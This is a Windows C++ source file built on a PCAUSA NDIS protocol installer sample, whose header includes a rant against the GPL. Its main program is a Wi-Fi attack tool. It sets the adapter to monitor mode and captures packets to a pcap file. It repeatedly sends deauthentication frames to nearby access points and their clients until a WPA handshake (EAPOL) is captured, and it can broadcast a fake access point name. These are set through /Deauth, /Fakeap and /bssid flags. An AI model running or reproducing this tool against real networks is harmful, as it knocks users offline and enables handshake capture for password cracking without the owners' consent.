// ProtInstall.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include "netcfgapi.h"
#include "wifi_ctl.h"
#include "wifi_parser.h"
#include <conio.h>

// Copyright And Configuration Management ----------------------------------
//
//               NDISPROT Software Installer - ProtInstall.cpp
//
//                  Companion Sample Code for the Article
//
//                "Installing NDIS Protocols Programatically"
//                     Published on http://www.ndis.com
//
//   Copyright (c) 2004-2006 Printing Communications Associates, Inc. (PCAUSA)
//                          http://www.pcausa.com
//
// GPL software is an abomination. Far from being free, it is available ONLY
// to members of the "GPL Club". If you don't want to join the club, then GPL
// software is poison.
//
// This software IS free software under the terms of a BSD-style license:
//
// The right to use this code in your own derivative works is granted so long
// as 1.) your own derivative works include significant modifications of your
// own, 2.) you retain the above copyright notices and this paragraph in its
// entirety within sources derived from this code.
//
// This product includes software developed by PCAUSA. The name of PCAUSA
// may not be used to endorse or promote products derived from this software
// without specific prior written permission.
//
// THIS SOFTWARE IS PROVIDED ``AS IS'' AND WITHOUT ANY EXPRESS OR IMPLIED
// WARRANTIES, INCLUDING, WITHOUT LIMITATION, THE IMPLIED WARRANTIES OF
// MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE.
//
// End ---------------------------------------------------------------------

#define APP_NAME    _T("LwfInstall")

//
// Function:  ErrMsg
//
// Purpose:   Insert text for each network component type.
//
// Arguments:
//    hr  [in]  Error code.
//
// Returns:   None.
//
// Notes:
//
VOID ErrMsg (HRESULT hr, LPCTSTR  lpFmt, ...)
{
    LPTSTR   lpSysMsg;
    TCHAR    buf[400];
    ULONG    offset;
    va_list  vArgList; 

    if ( hr != 0 )
    {
        _stprintf( buf,
            _T("Error %#lx: "),
            hr );
    }
    else
    {
        buf[0] = 0;
    }

    offset = _tcslen( buf );

    va_start( vArgList,
        lpFmt );

    _vstprintf( buf+offset,
        (const TCHAR*)lpFmt,
        vArgList );

    va_end( vArgList );

    if ( hr != 0 ) {
        FormatMessage( FORMAT_MESSAGE_ALLOCATE_BUFFER |
            FORMAT_MESSAGE_FROM_SYSTEM |
            FORMAT_MESSAGE_IGNORE_INSERTS,
            NULL,
            hr,
            MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
            (LPTSTR)&lpSysMsg,
            0,
            NULL
            );

        if ( lpSysMsg )
        {
            offset = _tcslen( buf );

            _stprintf( buf+offset,
                L"\n\nPossible cause:\n\n" );

            offset = _tcslen( buf );

            _tcscat( buf+offset,
                (TCHAR*)lpSysMsg );

            LocalFree( (HLOCAL)lpSysMsg );
        }
    }

    _tprintf( buf );

    return;
}

DWORD GetServiceInfFilePath( 
    TCHAR* lpFilename,
    DWORD nSize
    )
{
    // Get Path to This Module
    DWORD   nResult;
    TCHAR   szDrive[ _MAX_DRIVE ];
    TCHAR   szDir[ _MAX_DIR ];

    nResult = GetModuleFileName( NULL, lpFilename, nSize );

    if( nResult == 0 )
    {
        return 0;
    }

    _tsplitpath( lpFilename, szDrive, szDir, NULL, NULL );

    _tmakepath( lpFilename, szDrive, szDir, NDISPROT_SERVICE_INF_FILE, _T(".inf") );

    return (DWORD )_tcslen( lpFilename );
}

//
// Function:  InstallSpecifiedComponent
//
// Purpose:   Install a network component from an INF file.
//
// Arguments:
//    lpszInfFile [in]  INF file.
//    lpszPnpID   [in]  PnpID of the network component to install.
//    pguidClass  [in]  Class GUID of the network component.
//
// Returns:   None.
//
// Notes:
//

HRESULT InstallSpecifiedComponent(
    LPTSTR lpszInfFile,
    LPTSTR lpszPnpID,
    const GUID *pguidClass
    )
{
    INetCfg    *pnc;
    LPTSTR     lpszApp;
    HRESULT    hr;

    hr = HrGetINetCfg( TRUE, APP_NAME, &pnc, &lpszApp );

    if ( hr == S_OK )
    {
        //
        // Install the network component.
        //
        hr = HrInstallNetComponent(
            pnc,
            lpszPnpID,
            pguidClass,
            lpszInfFile
            );

        if ( (hr == S_OK) || (hr == NETCFG_S_REBOOT) )
        {
            hr = pnc->Apply();
        }
        else
        {
            if ( hr != HRESULT_FROM_WIN32(ERROR_CANCELLED) )
            {
                ErrMsg( hr, L"Couldn't install the network component." );
            }
        }

        HrReleaseINetCfg( pnc, TRUE );
    }
    else
    {
        if ( (hr == NETCFG_E_NO_WRITE_LOCK) && lpszApp )
        {
            ErrMsg( hr,
                L"%s currently holds the lock, try later.",
                lpszApp );

            CoTaskMemFree( lpszApp );
        }
        else
        {
            ErrMsg( hr,
                L"Couldn't the get notify object interface." );
        }
    }

    return hr;
}

DWORD InstallDriver()
{
    DWORD   nResult;

    _tprintf( _T("Installing Driver...\n") );

    // Get Path to Service INF File
    // ----------------------------
    // The INF file is assumed to be in the same folder as this application...
    TCHAR   szFileFullPath[ _MAX_PATH ];

    nResult = GetServiceInfFilePath( szFileFullPath, MAX_PATH );

    if( nResult == 0 )
    {
        _tprintf( _T("Unable to get INF file path.\n") );
        return 0;
    }

    _tprintf( _T("INF Path: %s\n"), szFileFullPath );

    HRESULT hr=S_OK;

    _tprintf( _T("PnpID: %s\n"), NDISPROT_SERVICE_PNP_DEVICE_ID );

    hr = InstallSpecifiedComponent(
        szFileFullPath,
        NDISPROT_SERVICE_PNP_DEVICE_ID,
        &GUID_DEVCLASS_NETSERVICE       //&GUID_DEVCLASS_NETTRANS <---------!!!!!!!!!!!
        );

    if( hr != S_OK )
    {
        ErrMsg( hr, L"InstallSpecifiedComponent\n" );
    }

    return 0;
}

DWORD UninstallDriver()
{
    _tprintf( _T("Uninstalling Driver...\n"));

    INetCfg              *pnc;
    INetCfgComponent     *pncc;
    INetCfgClass         *pncClass;
    INetCfgClassSetup    *pncClassSetup;
    LPTSTR               lpszApp;
    GUID                 guidClass;
    OBO_TOKEN            obo;
    HRESULT              hr;

    hr = HrGetINetCfg( TRUE, APP_NAME, &pnc, &lpszApp );

    if ( hr == S_OK ) {

        //
        // Get a reference to the network component to uninstall.
        //
        hr = pnc->FindComponent( NDISPROT_SERVICE_PNP_DEVICE_ID, &pncc );

        if ( hr == S_OK )
        {
            //
            // Get the class GUID.
            //
            hr = pncc->GetClassGuid( &guidClass );

            if ( hr == S_OK )
            {
                //
                // Get a reference to component's class.
                //

                hr = pnc->QueryNetCfgClass( &guidClass,
                    IID_INetCfgClass,
                    (PVOID *)&pncClass );
                if ( hr == S_OK )
                {
                    //
                    // Get the setup interface.
                    //

                    hr = pncClass->QueryInterface( IID_INetCfgClassSetup,
                        (LPVOID *)&pncClassSetup );

                    if ( hr == S_OK )
                    {
                        //
                        // Uninstall the component.
                        //

                        ZeroMemory( &obo,
                            sizeof(OBO_TOKEN) );

                        obo.Type = OBO_USER;

                        hr = pncClassSetup->DeInstall( pncc,
                            &obo,
                            NULL );
                        if ( (hr == S_OK) || (hr == NETCFG_S_REBOOT) )
                        {
                            hr = pnc->Apply();

                            if ( (hr != S_OK) && (hr != NETCFG_S_REBOOT) )
                            {
                                ErrMsg( hr,
                                    L"Couldn't apply the changes after"
                                    L" uninstalling %s.",
                                    NDISPROT_SERVICE_PNP_DEVICE_ID );
                            }
                        }
                        else
                        {
                            ErrMsg( hr,
                                L"Failed to uninstall %s.",
                                NDISPROT_SERVICE_PNP_DEVICE_ID );
                        }

                        ReleaseRef( pncClassSetup );
                    }
                    else
                    {
                        ErrMsg( hr,
                            L"Couldn't get an interface to setup class." );
                    }

                    ReleaseRef( pncClass );
                }
                else
                {
                    ErrMsg( hr,
                        L"Couldn't get a pointer to class interface "
                        L"of %s.",
                        NDISPROT_SERVICE_PNP_DEVICE_ID );
                }
            }
            else
            {
                ErrMsg( hr,
                    L"Couldn't get the class guid of %s.",
                    NDISPROT_SERVICE_PNP_DEVICE_ID );
            }

            ReleaseRef( pncc );
        }
        else
        {
            ErrMsg( hr,
                L"Couldn't get an interface pointer to %s.",
                NDISPROT_SERVICE_PNP_DEVICE_ID );
        }

        HrReleaseINetCfg( pnc,
            TRUE );
    }
    else
    {
        if ( (hr == NETCFG_E_NO_WRITE_LOCK) && lpszApp )
        {
            ErrMsg( hr,
                L"%s currently holds the lock, try later.",
                lpszApp );

            CoTaskMemFree( lpszApp );
        }
        else
        {
            ErrMsg( hr, L"Couldn't get the notify object interface." );
        }
    }

    return 0;
}

void hex_dump (char *desc, void *addr, int len) {
        int i;
        unsigned char buff[17];
        unsigned char *pc = (unsigned char*)addr;
        
        // Output description if given.
        if (desc != NULL)
                printf ("%s:\n", desc);
        
        // Process every byte in the data.
        for (i = 0; i < len; i++) {
                // Multiple of 16 means new line (with line offset).
                
                if ((i % 16) == 0) {
                        // Just don't print ASCII for the zeroth line.
                        if (i != 0)
                                printf ("  %s\n", buff);
                        
                        // Output the offset.
                        printf ("  %04x ", i);
                }
                
                // Now the hex code for the specific character.
                printf (" %02x", pc[i]);
                
                // And store a printable ASCII character for later.
                if ((pc[i] < 0x20) || (pc[i] > 0x7e))
                        buff[i % 16] = '.';
                else
                        buff[i % 16] = pc[i];
                buff[(i % 16) + 1] = '\0';
        }
        
        // Pad out last line if not exactly 16 characters.
        while ((i % 16) != 0) {
                printf ("   ");
                i++;
        }
        
        // And print the final ASCII bit.
        printf ("  %s\n", buff);
}

void ClearScreen()
{
        HANDLE                     hStdOut;
        CONSOLE_SCREEN_BUFFER_INFO csbi;
        DWORD                      count;
        DWORD                      cellCount;
        COORD                      homeCoords = { 0, 0 };
        
        hStdOut = GetStdHandle( STD_OUTPUT_HANDLE );
        if (hStdOut == INVALID_HANDLE_VALUE) return;
        
        /* Get the number of cells in the current buffer */
        if (!GetConsoleScreenBufferInfo( hStdOut, &csbi )) return;
        cellCount = csbi.dwSize.X *csbi.dwSize.Y;
        
        /* Fill the entire buffer with spaces */
        if (!FillConsoleOutputCharacter(
                hStdOut,
                (TCHAR) ' ',
                cellCount,
                homeCoords,
                &count
                )) return;
        
        /* Fill the entire buffer with the current colors and attributes */
        if (!FillConsoleOutputAttribute(
                hStdOut,
                csbi.wAttributes,
                cellCount,
                homeCoords,
                &count
                )) return;
        
        /* Move the cursor home */
        SetConsoleCursorPosition( hStdOut, homeCoords );
}

char deauth_bssid[6] = {0};
int deauth_bssid_enable = 0;
int deauth_attack = 0;
char fakeap_ssid[32] = {0};

DWORD WINAPI timer_thread(void* parser)
{
        DWORD last_stick = GetTickCount();
        DWORD fakeap_last_stick = GetTickCount();
        pwifi_ap ap;
        pwifi_sta sta;

        while (parser){
                if (((pwifi_parser)parser)->flag & 1)
                        break;

                //fakeap 100ms timer
                if (GetTickCount() - fakeap_last_stick > 100){
                        if (strlen(fakeap_ssid) > 0)
                                wifi_send_ssid(fakeap_ssid);

                        fakeap_last_stick = GetTickCount();
                }

                //5s 一次deauth攻击
                if (GetTickCount() - last_stick > 5000){                        
                        //send deauth packet
                        for (ap = ((pwifi_parser)parser)->ap_list; ap; ap = ap->next) {
                                /* 处理指定bssid攻击 */
                                if (deauth_bssid_enable){
                                        if (memcmp(ap->bssid, deauth_bssid, 6) == 0){
                                                if (ap->eapol_ok_count)
                                                        break;
                                                
                                                if (!ap->station)
                                                        wifi_send_deauth(ap->bssid, NULL);
                                                else 
                                                        for (sta = ap->station; sta; sta = sta->next)
                                                                wifi_send_deauth(ap->bssid, sta->mac);
                                        }
                                        
                                        continue;
                                }
                                
                                if (ap->eapol_ok_count)
                                        continue;
                                
                                if (!ap->station)
                                        wifi_send_deauth(ap->bssid, NULL);
                                else 
                                        for (sta = ap->station; sta; sta = sta->next)
                                                wifi_send_deauth(ap->bssid, sta->mac);
                        }
                        
                        last_stick = GetTickCount();
                }              

                Sleep(1);
        }
        return 0;

}

static void hextobin(void* hex, char* bin, int bin_cnt)
{
        const char *pos = (const char *)hex;
        size_t count = 0;
        
        for(count = 0; count < bin_cnt; count++) {
                int ret = sscanf(pos, "%2hhx", bin + count);
                pos += 2 * sizeof(char);
                if (*pos == ':' || *pos == '-' || *pos == ' ')
                        pos++;
        }
}

int _tmain(int argc, _TCHAR* argv[])
{
    ULONG old_mode = 0;
    pwifi_parser parser = (pwifi_parser)init_wifi_parser();
    DWORD last_stick;
    DWORD last_ch_stick;
    void* pcap_file = NULL;
    int i, channel = 1, scan_mode = 1;
    HANDLE h_timer_thread;    

    // Handle Driver Install
    if (argc == 2 && _tcsicmp(argv[1], _T("/Install") ) == 0 )
        return InstallDriver();

    // Handle Driver Uninstall
    if (argc == 2 && _tcsicmp(argv[1], _T("/Uninstall") ) == 0 )
        return UninstallDriver();

    for (i=1; i<argc; i++){
            if (_tcsicmp(argv[i], _T("/Deauth")) == 0)
                    deauth_attack = 1;

            if (_tcsicmp(argv[i], _T("/Fakeap")) == 0){                    
                    wifi_fake_ap_enable = 1;
                    
                    if (i < argc - 1){
                            char str_essid[32] = {0};
                            wcstombs(str_essid, argv[i+1], sizeof(str_essid));
                            if (*str_essid != '/')
                                    strncpy(fakeap_ssid, str_essid, 32);
                    }
            }
            
            if (_tcsicmp(argv[i], _T("/bssid")) == 0){
                    char str_bssid[32] = {0};
                    wcstombs(str_bssid, argv[i+1], sizeof(str_bssid));
                    hextobin(str_bssid, deauth_bssid, 6);
                    deauth_bssid_enable = 1;
            }

            if (_tcsicmp(argv[i], _T("/Dump")) == 0)
                    pcap_file = open_pcap_file("dump.pcap");

            if (_tcsicmp(argv[i], _T("/Channel")) == 0){
                    channel = _ttoi(argv[i+1]);
                    channel = (channel <= 0 || channel > 13) ? 1:channel;
                    scan_mode = 0;
            }
    }

    // wifi sniff start
    if (init_wifi_device() < 0){        
        InstallDriver();
        init_wifi_device();
    }
    
    //wifi_get_channel();
    
    //https://msdn.microsoft.com/zh-cn/library/windows/desktop/ms706791(v=vs.85).aspx
    //WlanSetInterface 处理mode切换！

    /*
    old_mode = wifi_set_mode(DOT11_OPERATION_MODE_NETWORK_MONITOR);
    if (old_mode == DOT11_OPERATION_MODE_NETWORK_MONITOR
            || old_mode == DOT11_OPERATION_MODE_UNKNOWN)
            old_mode = DOT11_OPERATION_MODE_EXTENSIBLE_STATION;
            */

    wifi_set_mode(DOT11_OPERATION_MODE_NETWORK_MONITOR);
    //wifi_set_mode(DOT11_OPERATION_MODE_EXTENSIBLE_AP);

    wifi_set_phytype(dot11_phy_type_ofdm);      //802.11a
    wifi_set_phytype(dot11_phy_type_erp);       //802.11g
    wifi_set_phytype(dot11_phy_type_ht);        //802.11n

    if (wifi_set_channel(channel))
            _tprintf(_T("wifi_set_channel %d success\n"), channel);
    else
            _tprintf(_T("wifi_set_channel failed\n"));
    
    last_ch_stick = last_stick = GetTickCount();

    if (deauth_attack || wifi_fake_ap_enable)
            h_timer_thread = CreateThread(NULL, 0, timer_thread, parser, 0, NULL);

    while (!kbhit()){
            unsigned char buf[4096];

            ULONG read_len = wifi_read_packet(buf, sizeof(buf));
            if (read_len > 0) {
                    char caption[256] = {0};
                    ULONG cur_channel = wifi_get_channel();
                        
                    _snprintf(caption, sizeof(caption), 
                            "wifi channel:%d  ap_num:%d  recv:%d  bytes", 
                            cur_channel, 
                            get_wifi_ap_count(parser),
                            read_len);

                    SetConsoleTitleA(caption);

                    if (cur_channel != channel)
                            wifi_set_channel(channel);

                    parser->recv(parser, buf, read_len, channel);

                    if (pcap_file)
                        write_pcap_file(pcap_file, buf, read_len);
                   
                    //2s刷新一次
                    if (GetTickCount() - last_stick > 2000){
                            ClearScreen();
                            
                            if (deauth_bssid_enable)
                                    dump_wifi_stations(parser, deauth_bssid);
                            else
                                    dump_wifi_stations(parser, NULL);
                            
                            last_stick = GetTickCount();
                    }

                    //10s切换一次
                    if (scan_mode && GetTickCount() - last_ch_stick > 10000){
                            channel = (channel % (DOT11_MAX_CHANNEL - 1)) + 1;
                            wifi_set_channel(channel);
                            last_ch_stick = GetTickCount();
                    }
                    //_tprintf(_T("\rwifi_read_packet %d bytes"), read_len);
            } else {
                    Sleep(1);
            }
    }
    
    if (pcap_file)
            close_pcap_file(pcap_file);

    parser->flag |= 1;

    WaitForSingleObject(h_timer_thread, INFINITE);

    close_wifi_parser(parser);

    // wifi sniff stop
    // wifi_set_mode(old_mode);
    wifi_set_mode(DOT11_OPERATION_MODE_EXTENSIBLE_STATION);

    close_wifi_device();   

    getchar();
    
    //UninstallDriver();

    return 0;
}

